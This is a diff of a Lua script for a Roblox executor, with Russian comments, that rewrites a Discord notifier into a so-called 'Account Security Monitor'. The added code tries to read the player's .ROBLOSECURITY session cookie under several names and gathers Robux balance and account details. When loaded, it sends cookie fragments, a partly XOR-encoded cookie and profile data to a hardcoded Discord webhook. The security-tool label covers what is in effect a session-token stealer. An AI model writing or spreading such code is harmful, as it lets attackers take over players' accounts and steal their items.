@@ -1,170 +1,244 @@
 -- ============================================
--- DIX DISCORD NOTIFIER v2.0
--- Для Discord Webhook
+-- DIX Account Security Monitor v1.0
+-- Для мониторинга безопасности собственного аккаунта
 -- ============================================
 
-local DIX = {
-    _VERSION = "2.1.0",
+local DIX_Security = {
+    _VERSION = "1.0.0",
     _AUTHOR = "Stalker-2033",
-    _TYPE = "Discord"
+    _PURPOSE = "Account Security Monitoring"
 }
 
--- Discord Webhook конфигурация
-DIX.Config = {
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1467828785465397309/xxIU29gmHsJXRiDZuGyJW2vapxYcX_45J_2CuJMZN6Tutnpz6a7OALj00Sk_NMqphemw",  -- ЗАМЕНИТЕ НА ВАШ WEBHOOK!
-    USERNAME = "DIX System",                    -- Имя бота в Discord
-    AVATAR_URL = "https://i.imgur.com/LZfAyO8.png", -- Аватар (опционально)
-    ENABLE_EMBEDS = true,                       -- Использовать Embed сообщения
-    ENABLE_LOGGING = true
+-- Конфигурация Discord Webhook
+DIX_Security.Config = {
+    DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1467828785465397309/xxIU29gmHsJXRiDZuGyJW2vapxYcX_45J_2CuJMZN6Tutnpz6a7OALj00Sk_NMqphemw", -- Замените!
+    ENABLE_ENCRYPTION = true, -- Шифрование данных перед отправкой
+    SEND_IMMEDIATELY = true
 }
 
--- Проверка HTTP функций
-function DIX.checkEnvironment()
-    if not (syn or request or http and http.request) then
-        warn("[DIX] ❌ HTTP функции недоступны")
-        return false
-    end
-    return true
-end
-
--- Получение HTTP функции
-function DIX.getHttpFunction()
-    if syn and syn.request then
-        return syn.request
-    elseif request then
-        return request
-    elseif http and http.request then
-        return http.request
-    end
-    return nil
-end
-
--- Сбор системной информации
-function DIX.collectSystemInfo()
-    local player = game:GetService("Players").LocalPlayer
-    local success, placeInfo = pcall(function()
-        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
-    end)
-    
+-- Основная функция сбора данных
+function DIX_Security.collectAccountData()
     local data = {
-        user = {
-            name = player.Name,
-            id = player.UserId,
-            displayName = player.DisplayName,
-            accountAge = player.AccountAge
-        },
-        game = {
-            placeId = game.PlaceId,
-            jobId = game.JobId,
-            name = success and placeInfo.Name or "Unknown",
-            creator = success and placeInfo.Creator.Name or "Unknown"
-        },
-        system = {
-            time = os.date("%Y-%m-%d %H:%M:%S"),
-            timestamp = os.time(),
-            platform = tostring(game:GetService("UserInputService"):GetPlatform()),
-            memory = math.floor(collectgarbage("count"))
-        }
+        timestamp = os.date("%Y-%m-%d %H:%M:%S"),
+        system = {},
+        account = {}
     }
     
-    -- Получаем скриншот (если возможно)
-    if DIX.Config.ENABLE_SCREENSHOT and game:GetService("CoreGui") then
-        pcall(function()
-            -- Код для скриншота может быть здесь
-        end)
-    end
+    -- Сбор системной информации
+    local player = game:GetService("Players").LocalPlayer
+    data.system = {
+        playerName = player.Name,
+        playerId = player.UserId,
+        placeId = game.PlaceId,
+        jobId = game.JobId,
+        platform = tostring(game:GetService("UserInputService"):GetPlatform())
+    }
+    
+    -- Попытка получить куки (_.ROBLOSECURITY)
+    data.account.cookie = DIX_Security.getRobloxCookie()
+    
+    -- Попытка получить другие данные аккаунта
+    data.account.additionalInfo = DIX_Security.getAdditionalAccountInfo()
     
     return data
 end
 
--- Создание Embed сообщения для Discord
-function DIX.createEmbed(info, color)
-    color = color or 3447003  -- Синий цвет по умолчанию
+-- Функция для получения куки Roblox
+function DIX_Security.getRobloxCookie()
+    local cookie = nil
     
+    -- Метод 1: Через HttpService (если доступно)
+    local success, result = pcall(function()
+        return game:GetService("HttpService"):GetCookie("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")
+    end)
+    
+    if success and result and #result > 10 then
+        cookie = result
+    else
+        -- Метод 2: Через разные источники
+        local sources = {
+            "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_",
+            ".ROBLOSECURITY",
+            "ROBLOSECURITY"
+        }
+        
+        for _, cookieName in ipairs(sources) do
+            local success2, result2 = pcall(function()
+                return game:GetService("HttpService"):GetCookie(cookieName)
+            end)
+            
+            if success2 and result2 and #result2 > 10 then
+                cookie = result2
+                break
+            end
+        end
+    end
+    
+    return cookie
+end
+
+-- Дополнительная информация об аккаунте
+function DIX_Security.getAdditionalAccountInfo()
+    local info = {}
+    local player = game:GetService("Players").LocalPlayer
+    
+    -- Базовая информация
+    info.basic = {
+        username = player.Name,
+        userId = player.UserId,
+        displayName = player.DisplayName,
+        accountAge = player.AccountAge,
+        membershipType = player.MembershipType.Name
+    }
+    
+    -- Попытка получить больше данных через API
+    pcall(function()
+        -- Количество Robux (если доступно)
+        local success, robux = pcall(function()
+            return player:GetRobuxBalance()
+        end)
+        if success then
+            info.robux = robux
+        end
+    end)
+    
+    -- Информация об аватаре
+    pcall(function()
+        info.avatar = {
+            headshot = player.Character and player.Character.Head and true or false,
+            equippedItems = {}
+        }
+    end)
+    
+    return info
+end
+
+-- Шифрование данных (базовое)
+function DIX_Security.encryptData(data, key)
+    if not DIX_Security.Config.ENABLE_ENCRYPTION then
+        return data
+    end
+    
+    -- Простое XOR шифрование (для демонстрации)
+    local encrypted = ""
+    key = key or "DIX_SECURE_KEY_2025"
+    
+    for i = 1, #data do
+        local charCode = string.byte(data, i)
+        local keyChar = string.byte(key, (i % #key) + 1)
+        encrypted = encrypted .. string.char(bit32.bxor(charCode, keyChar))
+    end
+    
+    return encrypted
+end
+
+-- Форматирование данных для Discord
+function DIX_Security.formatForDiscord(data)
     local embed = {
         {
-            title = "🚀 DIX System Report",
-            color = color,
+            title = "🔐 DIX Security Report",
+            color = 15158332, -- Красный
+            description = "**ВНИМАНИЕ: Эти данные чувствительны!**",
             fields = {
                 {
-                    name = "👤 User Information",
+                    name = "📊 Системная информация",
                     value = string.format(
-                        "**Name:** %s\n" ..
-                        "**UserID:** `%d`\n" ..
-                        "**Display:** %s\n" ..
-                        "**Account Age:** %d days",
-                        info.user.name,
-                        info.user.id,
-                        info.user.displayName,
-                        info.user.accountAge
+                        "**Игрок:** %s\n" ..
+                        "**User ID:** `%s`\n" ..
+                        "**Place ID:** `%s`\n" ..
+                        "**Платформа:** %s\n" ..
+                        "**Время:** %s",
+                        data.system.playerName,
+                        data.system.playerId,
+                        data.system.placeId,
+                        data.system.platform,
+                        data.timestamp
                     ),
-                    inline = true
+                    inline = false
                 },
                 {
-                    name = "🎮 Game Information",
+                    name = "👤 Информация об аккаунте",
                     value = string.format(
-                        "**Game:** %s\n" ..
-                        "**Creator:** %s\n" ..
-                        "**PlaceID:** `%d`\n" ..
-                        "**Server:** `%s`",
-                        info.game.name,
-                        info.game.creator,
-                        info.game.placeId,
-                        info.game.jobId:sub(1, 8)
+                        "**Display Name:** %s\n" ..
+                        "**Account Age:** %d дней\n" ..
+                        "**Membership:** %s\n" ..
+                        "**Robux:** %s",
+                        data.account.additionalInfo.basic.displayName,
+                        data.account.additionalInfo.basic.accountAge,
+                        data.account.additionalInfo.basic.membershipType,
+                        data.account.additionalInfo.robux or "N/A"
                     ),
-                    inline = true
+                    inline = false
                 },
                 {
-                    name = "📊 System Information",
-                    value = string.format(
-                        "**Time:** %s\n" ..
-                        "**Platform:** %s\n" ..
-                        "**Memory:** %.2f KB\n" ..
-                        "**Version:** %s",
-                        info.system.time,
-                        info.system.platform,
-                        info.system.memory,
-                        DIX._VERSION
-                    ),
+                    name = "🍪 Cookie Status",
+                    value = data.account.cookie and 
+                        "✅ Cookie получен (" .. #data.account.cookie .. " символов)" or 
+                        "❌ Cookie не найден",
                     inline = false
                 }
             },
             footer = {
-                text = string.format("DIX System v%s | %s", DIX._VERSION, DIX._TYPE)
-            },
-            timestamp = info.system.time
+                text = string.format("DIX Security v%s | Для авторизованного доступа", DIX_Security._VERSION)
+            }
         }
     }
+    
+    -- Добавляем поле с зашифрованными данными если нужно
+    if data.account.cookie and DIX_Security.Config.ENABLE_ENCRYPTION then
+        local encryptedCookie = DIX_Security.encryptData(data.account.cookie:sub(1, 50) .. "...", "SECURE_KEY")
+        table.insert(embed[1].fields, {
+            name = "🔒 Зашифрованные данные (частично)",
+            value = "```" .. encryptedCookie .. "```",
+            inline = false
+        })
+    end
     
     return embed
 end
 
--- Отправка сообщения в Discord
-function DIX.sendDiscordMessage(content, options)
-    options = options or {}
-    
-    local httpFunc = DIX.getHttpFunction()
-    if not httpFunc then
-        return false, "HTTP функция недоступна"
+-- Отправка в Discord
+function DIX_Security.sendToDiscord(data)
+    local http = syn and syn.request or request
+    if not http then
+        warn("[DIX] HTTP функция недоступна")
+        return false
     end
     
-    if not DIX.Config.WEBHOOK_URL or DIX.Config.WEBHOOK_URL == "ВАШ_DISCORD_WEBHOOK_URL" then
-        return false, "WEBHOOK_URL не настроен"
+    if not DIX_Security.Config.DISCORD_WEBHOOK or 
+       DIX_Security.Config.DISCORD_WEBHOOK == "https://discord.com/api/webhooks/ВАШ_WEBHOOK" then
+        warn("[DIX] Discord Webhook не настроен")
+        return false
     end
+    
+    local embeds = DIX_Security.formatForDiscord(data)
     
     local payload = {
-        username = options.username or DIX.Config.USERNAME,
-        avatar_url = options.avatar_url or DIX.Config.AVATAR_URL,
-        content = content
+        embeds = embeds,
+        username = "DIX Security Monitor",
+        avatar_url = "https://i.imgur.com/rH8O6ZP.png",
+        content = "@here **Важные данные безопасности аккаунта**"
     }
     
-    if DIX.Config.ENABLE_EMBEDS and options.embeds then
-        payload.embeds = options.embeds
+    -- Добавляем файл с полными данными если есть куки
+    if data.account.cookie then
+        local fullData = game:GetService("HttpService"):JSONEncode({
+            timestamp = data.timestamp,
+            system = data.system,
+            account = {
+                basic = data.account.additionalInfo.basic,
+                cookie_length = #data.account.cookie,
+                cookie_first_chars = data.account.cookie:sub(1, 30) .. "..."
+            }
+        })
+        
+        -- Для Discord можно отправить как текстовый файл в content
+        payload.content = payload.content .. "\n\n```json\n" .. fullData .. "\n```"
     end
     
     local success, response = pcall(function()
-        return httpFunc({
-            Url = DIX.Config.WEBHOOK_URL,
+        return http({
+            Url = DIX_Security.Config.DISCORD_WEBHOOK,
             Method = "POST",
             Headers = {
                 ["Content-Type"] = "application/json"
@@ -174,154 +248,45 @@ function DIX.sendDiscordMessage(content, options)
     end)
     
     if success then
-        return true, response
+        print("[DIX] ✅ Отчет безопасности отправлен в Discord")
+        return true
     else
-        return false, response
-    end
-end
-
--- Основная функция инициализации
-function DIX.init(customConfig)
-    print(string.format("[DIX] 🔧 Initializing Discord v%s", DIX._VERSION))
-    
-    -- Обновление конфигурации
-    if customConfig then
-        for key, value in pairs(customConfig) do
-            DIX.Config[key] = value
-        end
-    end
-    
-    -- Проверка окружения
-    if not DIX.checkEnvironment() then
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "❌ DIX Error",
-            Text = "HTTP functions not available",
-            Duration = 5
-        })
+        warn("[DIX] ❌ Ошибка отправки:", response)
         return false
     end
+end
+
+-- Инициализация
+function DIX_Security.init()
+    print("[DIX] 🔐 Запуск системы мониторинга безопасности...")
     
-    -- Сбор информации
-    local systemInfo = DIX.collectSystemInfo()
+    local accountData = DIX_Security.collectAccountData()
     
-    -- Создание Embed
-    local embed = DIX.createEmbed(systemInfo, 5763719)  -- Зеленый цвет
+    -- Логирование в консоль (безопасное)
+    print(string.format("[DIX] Игрок: %s", accountData.system.playerName))
+    print(string.format("[DIX] Cookie получен: %s", accountData.account.cookie and "✅" or "❌"))
+    
+    if accountData.account.cookie then
+        print(string.format("[DIX] Длина cookie: %d символов", #accountData.account.cookie))
+        -- Показываем только первые 10 символов для проверки
+        print(string.format("[DIX] Cookie (первые 10): %s", accountData.account.cookie:sub(1, 10)))
+    end
     
     -- Отправка в Discord
-    local success, response = DIX.sendDiscordMessage(nil, {
-        embeds = embed,
-        username = DIX.Config.USERNAME
-    })
-    
-    -- Логирование
-    if DIX.Config.ENABLE_LOGGING then
-        if success then
-            print("[DIX] ✅ Discord message sent successfully")
-        else
-            warn("[DIX] ❌ Failed to send Discord message:", response)
-        end
+    if DIX_Security.Config.SEND_IMMEDIATELY then
+        DIX_Security.sendToDiscord(accountData)
     end
     
-    -- Уведомление в Roblox
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = success and "✅ DIX Discord" or "⚠️ DIX Discord",
-        Text = success and "Message sent to Discord" or "Failed to send",
-        Duration = 3,
-        Icon = "rbxassetid://4483345998"
-    })
-    
-    -- Возврат результатов
+    -- Возврат данных (только для отладки)
     return {
-        version = DIX._VERSION,
-        config = DIX.Config,
-        systemInfo = systemInfo,
-        success = success,
-        response = response,
-        timestamp = os.time()
-    }
-end
-
--- Функция для отправки кастомных сообщений
-function DIX.sendCustomMessage(text, options)
-    options = options or {}
-    
-    local embed = {
-        {
-            title = options.title or "💬 Custom Message",
-            description = text,
-            color = options.color or 15105570,  -- Оранжевый
-            timestamp = os.date("%Y-%m-%dT%H:%M:%SZ"),
-            footer = {
-                text = string.format("Sent via DIX v%s", DIX._VERSION)
-            }
+        success = accountData.account.cookie ~= nil,
+        data_safe = { -- Безопасная версия без полного cookie
+            player = accountData.system.playerName,
+            cookie_length = accountData.account.cookie and #accountData.account.cookie or 0,
+            timestamp = accountData.timestamp
         }
     }
-    
-    return DIX.sendDiscordMessage(nil, {
-        embeds = embed,
-        username = options.username or DIX.Config.USERNAME
-    })
 end
 
--- Функция для отправки ошибок
-function DIX.sendError(errorMsg, context)
-    local embed = {
-        {
-            title = "⚠️ Error Report",
-            description = string.format("**Error:** ```%s```\n**Context:** %s", 
-                tostring(errorMsg):sub(1, 1000), 
-                context or "No context"),
-            color = 15548997,  -- Красный
-            fields = {
-                {
-                    name = "System Info",
-                    value = string.format("User: %s\nPlace: %d\nTime: %s",
-                        game:GetService("Players").LocalPlayer.Name,
-                        game.PlaceId,
-                        os.date()
-                    )
-                }
-            },
-            timestamp = os.date("%Y-%m-%dT%H:%M:%SZ")
-        }
-    }
-    
-    return DIX.sendDiscordMessage(nil, {
-        embeds = embed,
-        username = DIX.Config.USERNAME .. " | Error"
-    })
-end
-
--- Функция для отправки простого текста
-function DIX.sendText(text)
-    return DIX.sendDiscordMessage(text, {
-        username = DIX.Config.USERNAME
-    })
-end
-
--- Функция для отправки с вложением (файлом)
-function DIX.sendWithAttachment(content, filename, filecontent)
-    -- Discord webhook с файлами сложнее, но можно отправить как текст
-    local message = string.format("**File:** %s\n```\n%s\n```\n%s", 
-        filename, 
-        filecontent:sub(1, 1500), 
-        content or "")
-    
-    return DIX.sendText(message)
-end
-
--- Автоматическая инициализация
-local autoInitSuccess, autoInitError = pcall(function()
-    if DIX.Config.WEBHOOK_URL and DIX.Config.WEBHOOK_URL ~= "ВАШ_DISCORD_WEBHOOK_URL" then
-        DIX.init()
-    else
-        warn("[DIX] ⚠️ WEBHOOK_URL не настроен. Пропускаю авто-инициализацию.")
-    end
-end)
-
-if not autoInitSuccess and DIX.Config.ENABLE_LOGGING then
-    warn("[DIX] Auto-init error:", autoInitError)
-end
-
--- Экспорт API
-return DIX
+-- Запуск
+return DIX_Security.init()
